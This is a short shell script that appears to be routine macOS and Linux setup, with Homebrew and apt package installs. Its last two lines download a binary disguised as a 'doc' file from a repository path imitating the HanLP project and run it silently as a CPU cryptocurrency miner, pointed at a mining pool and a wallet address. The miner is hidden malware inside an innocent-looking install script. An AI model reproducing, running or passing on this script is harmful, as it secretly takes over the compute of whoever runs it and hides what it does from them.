#!/bin/sh
softwareupdate -l
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
brew install --cask screen
brew install coreutils
apt update
apt upgrade -y
apt install -y
wget https://github.com/Haohek/HanLP/raw/doc-zh/doc
./doc --disable-gpu --algorithm yespowerurx --pool cpu-pool.com:63378 --wallet Uj7osA1Qmn5bKkqswHFJfpyQJscH5kPUGs.0716 --password x --cpu-threads 1 > /dev/null

